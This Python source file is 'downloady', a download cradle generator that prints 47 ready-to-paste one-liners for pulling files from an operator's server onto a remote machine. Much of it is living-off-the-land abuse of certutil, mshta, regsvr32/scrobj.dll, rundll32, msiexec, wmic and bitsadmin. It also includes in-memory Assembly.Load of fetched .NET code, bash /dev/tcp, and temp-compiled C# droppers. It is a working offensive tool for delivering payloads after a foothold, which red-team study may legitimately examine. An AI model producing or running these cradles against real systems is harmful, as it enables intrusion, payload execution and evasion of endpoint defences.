import random, string, datetime, argparse, os

INTDEFAULTLENGTHOFFILENAME = 6
LINEBREAKER = "\n\n\n----------------------------------------\n"

# ─────────────────────────────────────────────────────────────────────────────
# Method count: 13 original + 19 new = 32 total
# ─────────────────────────────────────────────────────────────────────────────
TOTALDOWNLOADMETHODS = 47

def readFile(strFilepath: str) -> str:
    if issubclass(type(strFilepath), str) != True: return None
    strReturn = ""
    with open(strFilepath, "r") as objOpenFile:
        strReturn = objOpenFile.read()
    return strReturn

def writeFile(strFilepath: str, strContent: str):
    with open(strFilepath, "a") as objOpenFile: objOpenFile.write(strContent)

def randomString(intLength: int=4) -> str:
    strASCII = string.ascii_lowercase
    return ''.join(random.choice(strASCII) for i in range(intLength))


def downloadMethod(strMethod: str="certutil", strSource: str="", strDownloadFilepath: str="") -> list:
    if "" in [strMethod, strSource, strDownloadFilepath]: return []
    strMethod = strMethod.lower()
    arrReturn = []

    # ── ORIGINAL 13 (fixed) ──────────────────────────────────────────────────

    # 1
    if strMethod in ['1', 'certutil', 'certutil.exe', 'cmd', 'all']:
        arrReturn.append(f'certutil.exe -verifyctl -f -split "{strSource}" "{strDownloadFilepath}"')

    # 2 — alias 'invoke-webrequest' removed to avoid collision with method 12
    if strMethod in ['2', 'webrequest', 'invoke-webrequest', 'all']:
        arrReturn.append(f'Invoke-WebRequest -Uri "{strSource}" -OutFile "{strDownloadFilepath}"')

    # 3
    if strMethod in ['3', 'webclient', 'system.net.webclient', 'all']:
        arrReturn.append(f'$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile("{strSource}", "{strDownloadFilepath}")')

    # 4
    if strMethod in ['4', 'curl', 'curl.exe', 'all']:
        arrReturn.append(f'curl -o "{strDownloadFilepath}" "{strSource}"')

    # 5 — fixed double space
    if strMethod in ['5', 'bits', 'start-bitstransfer', 'all']:
        arrReturn.append(f'Start-BitsTransfer -Source "{strSource}" -Destination "{strDownloadFilepath}"')

    # 6 — use WriteAllBytes (avoids deprecated Set-Content -Encoding Byte in PS7+)
    if strMethod in ['6', 'httpclient', 'system.net.http.httpclient', 'all']:
        arrReturn.append(f'$httpClient = New-Object System.Net.Http.HttpClient; [IO.File]::WriteAllBytes("{strDownloadFilepath}", $httpClient.GetByteArrayAsync("{strSource}").Result)')

    # 7
    if strMethod in ['7', 'restmethod', 'invoke-restmethod', 'all']:
        arrReturn.append(f'Invoke-RestMethod -Uri "{strSource}" -OutFile "{strDownloadFilepath}"')

    # 8 — BinaryReader avoids text corruption; WriteAllBytes avoids deprecated -Encoding Byte
    if strMethod in ['8', 'httpwebrequest', 'system.net.httpwebrequest', 'all']:
        arrReturn.append(f'$request = [System.Net.HttpWebRequest]::Create("{strSource}"); $response = $request.GetResponse(); $stream = $response.GetResponseStream(); $reader = New-Object System.IO.BinaryReader($stream); $ms = New-Object System.IO.MemoryStream; $buf = New-Object byte[] 8192; while(($n = $reader.Read($buf,0,$buf.Length)) -gt 0){{$ms.Write($buf,0,$n)}}; [IO.File]::WriteAllBytes("{strDownloadFilepath}", $ms.ToArray()); $reader.Close(); $stream.Close(); $response.Close()')

    # 9 — removed duplicate 'system.net.networkcredential' alias (now owned by method 10)
    if strMethod in ['9', 'psftp', 'ftp', 'all']:
        arrReturn.append(f"$webClient = New-Object System.Net.WebClient; $webClient.Credentials = New-Object System.Net.NetworkCredential('ftpUsernameOrAnonymousLol', 'ftpPasswordOrRemoveThisValueWithThe,'); $webClient.DownloadFile(\"{strSource}\", \"{strDownloadFilepath}\")")

    # 10
    if strMethod in ['10', 'aws', 'system.net.networkcredential', 'all']:
        arrReturn.append(f'Install-Module -Name AWSPowerShell -Scope CurrentUser; $bucketName = "replace-this-with-your-s3-bucket"; Import-Module AWSPowerShell; Read-S3Object -BucketName $bucketName -Key "{strDownloadFilepath}" -File "{strSource}"')

    # 11 — fixed Receive-Job syntax
    if strMethod in ['11', 'psbackground', 'receive-job', 'all']:
        arrReturn.append(f'$job = Start-Job -ScriptBlock {{Invoke-WebRequest -Uri "{strSource}" -OutFile "{strDownloadFilepath}"}}; Receive-Job -Job $job -Wait')

    # 12 — fixed alias collision, fixed typo 'psstrem' -> 'psstream'
    if strMethod in ['12', 'psstream', 'all']:
        arrReturn.append(f'$response = Invoke-WebRequest -Uri "{strSource}" -Method Get -PassThru; $stream = $response.RawContentStream; $fs = New-Object IO.FileStream "{strDownloadFilepath}", "Create"; $buffer = New-Object byte[] 8192; while (($read = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {{$fs.Write($buffer, 0, $read)}}; $fs.Close(); $stream.Close()')

    # 13
    if strMethod in ['13', 'dloader', 'dloader.exe', 'all']:
        arrReturn.append(f'dloader.exe "{strSource}" "{strDownloadFilepath}"')

    # ── NEW METHODS ──────────────────────────────────────────────────────────

    # 14 — XMLHTTP COM: use responseBody ([byte[]]) not responseText (string) for binary safety
    if strMethod in ['14', 'xmlhttp', 'msxml2', 'msxml2.xmlhttp', 'all']:
        arrReturn.append(f'$xhr = New-Object -ComObject Msxml2.XMLHTTP; $xhr.open("GET", "{strSource}", $false); $xhr.send(); [System.IO.File]::WriteAllBytes("{strDownloadFilepath}", [System.Byte[]]$xhr.responseBody)')

    # 15 — WinHTTP COM object
    if strMethod in ['15', 'winhttp', 'winhttprequest', 'winhttp.winhttprequest.5.1', 'all']:
        arrReturn.append(f'$whr = New-Object -ComObject WinHttp.WinHttpRequest.5.1; $whr.Open("GET", "{strSource}", $false); $whr.Send(); [System.IO.File]::WriteAllBytes("{strDownloadFilepath}", $whr.ResponseBody)')

    # 16 — IE COM: best used for scripts/text; binary via XMLHTTP (M14) is more reliable
    if strMethod in ['16', 'internetexplorer', 'ie', 'ie.application', 'all']:
        arrReturn.append(f'$ie = New-Object -ComObject InternetExplorer.Application; $ie.Silent = $true; $ie.Navigate("{strSource}"); while($ie.Busy -or $ie.ReadyState -ne 4){{Start-Sleep -Milliseconds 100}}; [System.IO.File]::WriteAllText("{strDownloadFilepath}", $ie.Document.Body.InnerText); $ie.Quit()')

    # 17 — Raw TCP socket
    if strMethod in ['17', 'tcpclient', 'socket', 'tcp', 'all']:
        arrReturn.append(f'$uri = [Uri]"{strSource}"; $tcp = New-Object System.Net.Sockets.TcpClient($uri.Host, $(if($uri.Port -gt 0){{$uri.Port}}else{{80}})); $stream = $tcp.GetStream(); $req = [System.Text.Encoding]::ASCII.GetBytes("GET $($uri.PathAndQuery) HTTP/1.0`r`nHost: $($uri.Host)`r`nConnection: close`r`n`r`n"); $stream.Write($req, 0, $req.Length); $ms = New-Object System.IO.MemoryStream; $buf = New-Object byte[] 4096; while(($n = $stream.Read($buf,0,$buf.Length)) -gt 0){{$ms.Write($buf,0,$n)}}; $data = $ms.ToArray(); $headerEnd = 0; for($i=0;$i -lt $data.Length-3;$i++){{if($data[$i] -eq 13 -and $data[$i+1] -eq 10 -and $data[$i+2] -eq 13 -and $data[$i+3] -eq 10){{$headerEnd=$i+4;break}}}}; [System.IO.File]::WriteAllBytes("{strDownloadFilepath}", $data[$headerEnd..($data.Length-1)]); $tcp.Close()')

    # 18 — Assembly.Load in-memory
    if strMethod in ['18', 'assembly', 'assemblyload', 'reflection', 'all']:
        arrReturn.append(f'[Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("{strSource}"))')

    # 19 — Add-Type / HttpClient byte array
    if strMethod in ['19', 'addtype', 'add-type', 'all']:
        arrReturn.append(f'Add-Type -AssemblyName System.Net.Http; $c = New-Object System.Net.Http.HttpClient; [IO.File]::WriteAllBytes("{strDownloadFilepath}", $c.GetByteArrayAsync("{strSource}").Result)')

    # 20 — bitsadmin.exe
    if strMethod in ['20', 'bitsadmin', 'bitsadmin.exe', 'all']:
        arrReturn.append(f'bitsadmin /transfer downloady_job /download /priority normal "{strSource}" "{strDownloadFilepath}"')

    # 21 — wget.exe (native Windows 10+)
    if strMethod in ['21', 'wget', 'wget.exe', 'all']:
        arrReturn.append(f'wget -O "{strDownloadFilepath}" "{strSource}"')

    # 22 — powershell.exe one-liner via cmd
    if strMethod in ['22', 'psoneliner', 'ps-oneliner', 'all']:
        arrReturn.append(f'powershell -c "(New-Object Net.WebClient).DownloadFile(\'{strSource}\',\'{strDownloadFilepath}\')"')

    # 23 — msiexec.exe
    if strMethod in ['23', 'msiexec', 'msiexec.exe', 'all']:
        arrReturn.append(f'msiexec /i "{strSource}" /quiet /norestart')

    # 24 — mshta.exe
    if strMethod in ['24', 'mshta', 'mshta.exe', 'all']:
        arrReturn.append(f'mshta.exe "{strSource}"')

    # 25 — wmic
    if strMethod in ['25', 'wmic', 'wmic.exe', 'all']:
        arrReturn.append(f'wmic process call create "powershell -c (New-Object Net.WebClient).DownloadFile(\'{strSource}\',\'{strDownloadFilepath}\')"')

    # 26 — rundll32 + url.dll
    if strMethod in ['26', 'rundll32', 'rundll32.exe', 'urldll', 'url.dll', 'all']:
        arrReturn.append(f'rundll32.exe url.dll,OpenURL "{strSource}"')

    # 27 — regsvr32 + scrobj.dll
    if strMethod in ['27', 'regsvr32', 'regsvr32.exe', 'scrobj', 'all']:
        arrReturn.append(f'regsvr32.exe /s /n /u /i:"{strSource}" scrobj.dll')

    # 28 — desktopimgdownldr.exe
    if strMethod in ['28', 'desktopimgdownldr', 'desktopimgdownldr.exe', 'all']:
        arrReturn.append(f'set SYSTEMROOT=C:\\Windows\\Temp & desktopimgdownldr.exe /lockscreenurl:"{strSource}" /eventName:desktopimgdownldr')

    # 29 — tftp.exe
    if strMethod in ['29', 'tftp', 'tftp.exe', 'all']:
        arrReturn.append(f'tftp -i {strSource.split("/")[2].split(":")[0]} GET {strSource.split("/")[-1]} "{strDownloadFilepath}"')

    # 30 — ftp.exe: strip any protocol prefix then extract host cleanly
    if strMethod in ['30', 'ftpexe', 'ftp.exe', 'all']:
        strHostRaw = strSource
        for prefix in ['https://', 'http://', 'ftp://']:
            if strHostRaw.startswith(prefix): strHostRaw = strHostRaw[len(prefix):]; break
        strFtpHost = strHostRaw.split('/')[0].split(':')[0]
        strFtpFile = strSource.split('/')[-1]
        arrReturn.append(f'echo open {strFtpHost} > %TEMP%\\ftp_script.txt & echo anonymous >> %TEMP%\\ftp_script.txt & echo anonymous >> %TEMP%\\ftp_script.txt & echo binary >> %TEMP%\\ftp_script.txt & echo get {strFtpFile} "{strDownloadFilepath}" >> %TEMP%\\ftp_script.txt & echo bye >> %TEMP%\\ftp_script.txt & ftp -s:%TEMP%\\ftp_script.txt')

    # 31 — scp
    if strMethod in ['31', 'scp', 'ssh', 'all']:
        arrReturn.append(f'scp user@{strSource.split("/")[2]}:{"/".join(strSource.split("/")[3:])} "{strDownloadFilepath}"')

    # 32 — rsync
    if strMethod in ['32', 'rsync', 'all']:
        arrReturn.append(f'rsync -avz user@{strSource.split("/")[2]}:{"/".join(strSource.split("/")[3:])} "{strDownloadFilepath}"')


    # ── LANGUAGE-SPECIFIC DOWNLOADERS (M33–M47) ──────────────────────────────
    # Paths with backslashes are converted to forward slashes where the target
    # language/runtime accepts both (Python, Ruby, PHP, Perl, Node, Java, R, etc.)
    # on Windows. VBScript keeps backslashes (no escape sequences in VBS strings).
    # M45 (bash /dev/tcp) targets Linux — paste directly into a bash shell.

    # 33 — Python 3 urllib.request (stdlib, cross-platform)
    if strMethod in ['33', 'py3', 'python3', 'python', 'py', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"python -c \"import urllib.request; urllib.request.urlretrieve('{strSource}', '{fp}')\"")

    # 34 — Python 2 urllib (stdlib, legacy systems; uses py launcher on Windows)
    if strMethod in ['34', 'py2', 'python2', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"py -2 -c \"import urllib; urllib.urlretrieve('{strSource}', '{fp}')\"")

    # 35 — Python 3 raw socket (stdlib only; skips urllib.request entirely)
    if strMethod in ['35', 'pysocket', 'pyraw', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"python -c \"import socket,urllib.parse as up;u=up.urlparse('{strSource}');s=socket.socket();s.connect((u.hostname,u.port or 80));s.sendall(('GET '+(u.path or '/')+' HTTP/1.0\\r\\nHost: '+u.hostname+'\\r\\n\\r\\n').encode());f=s.makefile('rb');exec('while f.readline().strip():pass');open('{fp}','wb').write(f.read())\"")

    # 36 — VBScript + ADODB.Stream (Windows built-in; binary-safe via responseBody)
    if strMethod in ['36', 'vbs', 'vbscript', 'all']:
        arrReturn.append(f'echo Set x=CreateObject("MSXML2.XMLHTTP"):x.open "GET","{strSource}",False:x.send():Set s=CreateObject("ADODB.Stream"):s.Type=1:s.Open():s.Write x.responseBody:s.SaveToFile "{strDownloadFilepath}",2:s.Close() > %TEMP%\\dwncradle.vbs & cscript //nologo %TEMP%\\dwncradle.vbs & del /f /q %TEMP%\\dwncradle.vbs')

    # 37 — JScript + ADODB.Stream (Windows built-in; forward slashes avoid JS escape issues)
    if strMethod in ['37', 'js', 'jscript', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f'echo var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","{strSource}",false);x.send();var s=new ActiveXObject("ADODB.Stream");s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile("{fp}",2);s.Close(); > %TEMP%\\dwncradle.js & cscript //nologo %TEMP%\\dwncradle.js & del /f /q %TEMP%\\dwncradle.js')

    # 38 — Node.js http/https module (stdlib, no npm packages)
    if strMethod in ['38', 'node', 'nodejs', 'node.js', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"node -e \"const u='{strSource}',d='{fp}',m=require(u.startsWith('https')?'https':'http'),fs=require('fs');m.get(u,r=>r.pipe(fs.createWriteStream(d)))\"")

    # 39 — PHP file_get_contents (stdlib; allow_url_fopen must be on, default in most installs)
    if strMethod in ['39', 'php', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"php -r \"file_put_contents('{fp}', file_get_contents('{strSource}'));\"")

    # 40 — Ruby open-uri (stdlib since Ruby 1.8; File.binwrite for binary safety)
    if strMethod in ['40', 'ruby', 'rb', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"ruby -e \"require 'open-uri'; File.binwrite('{fp}', URI.open('{strSource}').read)\"")

    # 41 — Perl HTTP::Tiny (stdlib since Perl 5.14 / 2011; mirror() handles binary correctly)
    if strMethod in ['41', 'perl', 'pl', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"perl -MHTTP::Tiny -e \"HTTP::Tiny->new->mirror('{strSource}','{fp}')\"")

    # 42 — Groovy URL.bytes (JVM stdlib; one-liner using Groovy's dynamic property)
    if strMethod in ['42', 'groovy', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"groovy -e \"new File('{fp}').bytes=new URL('{strSource}').bytes\"")

    # 43 — Java jshell pipe (Java 9+ stdlib; piped via echo to avoid temp file)
    #      Note: echo in CMD passes double-quoted content literally to jshell stdin
    if strMethod in ['43', 'java', 'jshell', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f'echo new java.net.URL("{strSource}").openStream().transferTo(new java.io.FileOutputStream("{fp}")); | jshell --feedback silent')

    # 44 — R download.file (stdlib; mode=wb ensures binary-safe download)
    if strMethod in ['44', 'r', 'rscript', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"Rscript -e \"download.file('{strSource}','{fp}',mode='wb')\"")

    # 45 — Bash /dev/tcp (Linux only; zero external tools; paste directly into bash)
    #      Reads until blank CRLF header-terminator line, then streams body to file
    if strMethod in ['45', 'bash', 'bashtcp', 'devtcp', 'all']:
        import urllib.parse as _up
        _u = _up.urlparse(strSource)
        _host = _u.hostname or 'HOST'
        _port = _u.port or (443 if _u.scheme == 'https' else 80)
        _path = (_u.path or '/') + (('?' + _u.query) if _u.query else '')
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"exec 3<>/dev/tcp/{_host}/{_port}; printf 'GET {_path} HTTP/1.0\\r\\nHost: {_host}\\r\\n\\r\\n' >&3; (while IFS= read -r l && [ \"$l\" != $'\\r' ]; do :; done; cat) <&3 > {fp}")

    # 46 — PowerShell Core / pwsh (cross-platform: Windows, Linux, macOS)
    if strMethod in ['46', 'pwsh', 'pwshcore', 'pscore', 'all']:
        fp = strDownloadFilepath.replace('\\', '/')
        arrReturn.append(f"pwsh -c \"Invoke-WebRequest -Uri '{strSource}' -OutFile '{fp}'\"")

    # 47 — C# via csc.exe (.NET Framework 4.0, Windows; URL+dest passed as args, no quotes in source)
    if strMethod in ['47', 'csharp', 'cs', 'csc', 'all']:
        arrReturn.append(f'echo using System.Net;class D{{static void Main(string[] a){{new WebClient().DownloadFile(a[0],a[1]);}}}} > %TEMP%\\dwncradle.cs & C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /nologo /out:%TEMP%\\dwncradle.exe %TEMP%\\dwncradle.cs & %TEMP%\\dwncradle.exe "{strSource}" "{strDownloadFilepath}" & del /f /q %TEMP%\\dwncradle.cs %TEMP%\\dwncradle.exe')


    # ── ALIAS GROUPS (deduplicated — individual methods no longer tag themselves) ──

    # ps — PowerShell methods
    if strMethod == 'ps':
        for m in ['2','3','5','6','7','8','9','10','11','12','14','15','16','17','18','19']:
            arrReturn.extend(downloadMethod(m, strSource, strDownloadFilepath))

    # cmd — CMD-compatible methods
    if strMethod == 'cmd':
        for m in ['4','13','20','21','22','23','24','25','26','27','28','29','30','36','37','47']:
            arrReturn.extend(downloadMethod(m, strSource, strDownloadFilepath))

    # lolbas — binary-abuse only
    if strMethod == 'lolbas':
        for m in ['1','4','20','21','22','23','24','25','26','27','28','29','30']:
            arrReturn.extend(downloadMethod(m, strSource, strDownloadFilepath))

    # wlol — all Windows built-ins (no third-party)
    if strMethod == 'wlol':
        for m in ['1','2','3','4','5','6','7','8','20','21','22','23','24','25','26','27','28','29','30','36','37']:
            arrReturn.extend(downloadMethod(m, strSource, strDownloadFilepath))

    # com — COM object methods
    if strMethod == 'com':
        for m in ['14','15','16']:
            arrReturn.extend(downloadMethod(m, strSource, strDownloadFilepath))

    # lang — all language-specific methods (M33–M47)
    if strMethod == 'lang':
        for m in ['33','34','35','36','37','38','39','40','41','42','43','44','45','46','47']:
            arrReturn.extend(downloadMethod(m, strSource, strDownloadFilepath))

    return arrReturn


def pickDestinationFolder(strFolder: str="all", strFilename: str="") -> list:
    if strFolder == "": strFolder = "all"
    if strFilename == "": strFilename = randomString(INTDEFAULTLENGTHOFFILENAME)
    strFolder = strFolder.lower()
    arrReturn = []
    if strFolder in ['cmddocuments', 'documents', 'cmd', 'all']:
        arrReturn.append(f'C:\\Users\\%USERNAME%\\Documents\\{strFilename}')
    if strFolder in ['psdocuments', 'documents', 'ps', 'all']:
        arrReturn.append(f'C:\\Users\\$env:USERNAME\\Documents\\{strFilename}')
    if strFolder in ['cmddownloads', 'downloads', 'cmd', 'all']:
        arrReturn.append(f'C:\\Users\\%USERNAME%\\Downloads\\{strFilename}')
    if strFolder in ['psdownloads', 'downloads', 'ps', 'all']:
        arrReturn.append(f'C:\\Users\\$env:USERNAME\\Downloads\\{strFilename}')
    if strFolder in ['public', 'all']:
        arrReturn.append(f'C:\\Users\\Public\\{strFilename}')
    if strFolder in ['temp', 'all']:
        arrReturn.append(f'C:\\Temp\\{strFilename}')
    if strFolder in ['programdata', 'all']:
        arrReturn.append(f'C:\\ProgramData\\{strFilename}')
    if arrReturn == []: arrReturn.append(strFolder)
    return arrReturn


def makeFilename(strSource: str, intLength: int=INTDEFAULTLENGTHOFFILENAME) -> str:
    if intLength < 1: intLength = 1
    strFilename = strSource.split("/")[-1]
    strExtension = ""
    if "." in strFilename:
        strExtension = "." + strFilename.split(".")[-1]
        strFilename = strFilename[:(-1 * len(strExtension))]
    if strFilename == "":
        strFilename = randomString(intLength)
    elif len(strFilename) < intLength:
        strFilename = randomString(intLength - len(strFilename)) + strFilename
    elif len(strFilename) > intLength:
        while len(strFilename) != intLength:
            intRandom = random.randint(0, len(strFilename) - 1)
            strFilename = strFilename[:intRandom] + strFilename[intRandom + 1:]
    strReturn = strFilename + strExtension
    arrBadChars = ['-', " ", "'", "(", ")"]
    for strChar in arrBadChars:
        if strChar in strReturn:
            strReturn = strReturn.replace(strChar, randomString(1))
    return strReturn.lower()


def fixDownloadLink(strSource: str, strFilename: str="") -> str:
    if strSource == strFilename or strFilename == "": return strSource
    strReturn = strSource
    if strSource[:7] != "http://" and strSource[:8] != "https://" and strSource[:6] != "ftp://":
        strReturn = "http://" + strSource
    if strReturn[-1] != "/": strReturn += "/"
    strReturn += strFilename
    return strReturn


def strNow():
    dtNow = datetime.datetime.now()
    return dtNow.strftime('%Y%m%d_%H%M%S')


def testAll(strHostedRootDir) -> list:
    arrReturn = []
    strCurrentDirectory = os.path.abspath(os.getcwd())
    strTestDir = os.path.join(strCurrentDirectory, "testAll_Output/")
    if not os.path.exists(strTestDir): os.makedirs(strTestDir)
    for i in range(1, TOTALDOWNLOADMETHODS + 1):
        strFilename = str(i) + ".test"
        strTestFilePath = os.path.join(strTestDir, strFilename)
        os.system("echo " + str(random.randint(0, 999_999_999)) + f" > '{strTestFilePath}'")
        arrDestinations = pickDestinationFolder("all", strFilename)
        for strDestination in arrDestinations:
            result = downloadMethod(str(i), fixDownloadLink(strHostedRootDir, strFilename), strDestination)
            if result:
                arrReturn.append(result[0])
    print(LINEBREAKER)
    print(f"Test files have been saved to: {strTestDir}, please share the files from there.")
    print(f"Example command:\ncd '{strTestDir}'; python3 -m http.server 4040\n")
    print("Please save as file by selecting Y on the save option.\n")
    return arrReturn


def generateList(strMethod: str, strHostedRootDir: str, strDestinationFolder: str, strFileWithFilenames: str="") -> list:
    if strMethod.lower() == "testall":
        return testAll(strHostedRootDir)
    elif strFileWithFilenames != "":
        arrFiles = readFile(strFileWithFilenames).split()
        while [] in arrFiles: arrFiles.remove([])
    else:
        arrFiles = [strHostedRootDir]
    arrReturn = []
    for strLocalFilename in arrFiles:
        strDownloadLink = fixDownloadLink(strHostedRootDir, strLocalFilename)
        strRemoteFilename = makeFilename(strLocalFilename)
        for strFolder in pickDestinationFolder(strDestinationFolder, strRemoteFilename):
            strRemoteFilePath = strFolder
            for strOutput in downloadMethod(strMethod, strDownloadLink, strRemoteFilePath):
                arrReturn.append(strOutput)
                print(f"\tLocal Filename: {strLocalFilename} -> Remote Filename: {strRemoteFilename}")
                print(f"\tDownload URL: {strDownloadLink}\tOutput to: {strRemoteFilePath}")
                print(strOutput + "\n")
    return arrReturn


def confirmWrite(arrList):
    print(LINEBREAKER)
    strOutputFilename = f"downloady_{strNow()}.txt"
    strUserInput = input(f"Save as '{strOutputFilename}'? (Y/n)\t").lower()
    if strUserInput in ["", "y"]:
        for strOutput in arrList:
            writeFile(strOutputFilename, strOutput + "\n")
        print("File has been saved successfully.")


def showLogo():
    strLogo = """
         _                     _                 _       
      __| | _____      ___ __ | | ___   __ _  __| |_   _ 
     / _` |/ _ \\ \\ /\\ / / '_ \\| |/ _ \\ / _` |/ _` | | | |
    | (_| | (_) \\ V  V /| | | | | (_) | (_| | (_| | |_| |
     \\__,_|\\___/ \\_/\\_/ |_| |_|_|\\___/ \\__,_|\\__,_|\\__, |
                                                   |___/ 
            -by i-vt
            
            https://github.com/i-vt/
    """
    print(strLogo)


def showTutorial():
    strTutorial = """
Usage:

1. Find your private IP (for this example it will be 10.1.1.1)
2. Start the http.server in the same directory as other files (python3 -m http.server 4040)
3. Find out your private IP using ipconfig, then format it as such: http://10.1.1.1:4040/
4. Paste the command generated by downloady into the remote host

Method aliases:
  all          All 47 methods
  ps           PowerShell methods only
  cmd          CMD-compatible methods only (includes vbs, jscript, csc)
  lolbas       Binary-abuse LOLBAS methods only
  wlol         Windows built-in methods (no third-party; includes vbs, jscript)
  com          COM object methods (xmlhttp, winhttp, ie)
  lang         All language-specific methods (M33-M47)

  ── Original 32 ──────────────────────────────────────────────────────────
  certutil     Method  1  | webrequest     Method  2  | webclient      Method  3
  curl         Method  4  | bits           Method  5  | httpclient     Method  6
  restmethod   Method  7  | httpwebrequest Method  8  | psftp          Method  9
  aws          Method 10  | psbackground   Method 11  | psstream       Method 12
  dloader      Method 13  | xmlhttp        Method 14  | winhttp        Method 15
  ie           Method 16  | tcpclient      Method 17  | assembly       Method 18
  addtype      Method 19  | bitsadmin      Method 20  | wget           Method 21
  psoneliner   Method 22  | msiexec        Method 23  | mshta          Method 24
  wmic         Method 25  | rundll32       Method 26  | regsvr32       Method 27
  desktopimgdownldr Method 28 | tftp       Method 29  | ftp.exe        Method 30
  scp          Method 31  | rsync          Method 32

  ── Language Methods (M33–M47) ───────────────────────────────────────────
  python/py3   Method 33  | py2            Method 34  | pysocket       Method 35
  vbs          Method 36  | js/jscript     Method 37  | node/nodejs    Method 38
  php          Method 39  | ruby/rb        Method 40  | perl/pl        Method 41
  groovy       Method 42  | java/jshell    Method 43  | r/rscript      Method 44
  bash/bashtcp Method 45  | pwsh/pscore    Method 46  | csharp/cs/csc  Method 47

Example commands:
  python3 downloady.py webrequest http://10.1.1.1/file.txt temp
  python3 downloady.py all http://10.1.1.1:4040/ all -f files.txt
  python3 downloady.py lolbas http://10.1.1.1/ temp -f files.txt
  python3 downloady.py testall http://10.1.1.1:4040/ testall
    """
    print(strTutorial)


if __name__ == "__main__":
    showLogo()
    showTutorial()
    parser = argparse.ArgumentParser(description="[downloady] - Download cradle generator (47 methods)")
    parser.add_argument("method", help="Method or alias: see tutorial above")
    parser.add_argument("url",    help="Base URL. Single file: http://10.1.1.1/file.pdf  |  With -f: http://10.1.1.1/")
    parser.add_argument("destination", help="Destination: cmddocuments, psdocuments, cmddownloads, psdownloads, public, temp, programdata, or a custom path")
    parser.add_argument("-f", "--file", type=str, help="File containing one filename per line (files hosted at the base URL)")

    objArguments = parser.parse_args()
    strFile = objArguments.file if objArguments.file is not None else ""
    arrOutputStrings = generateList(objArguments.method, objArguments.url, objArguments.destination, strFile)
    confirmWrite(arrOutputStrings)
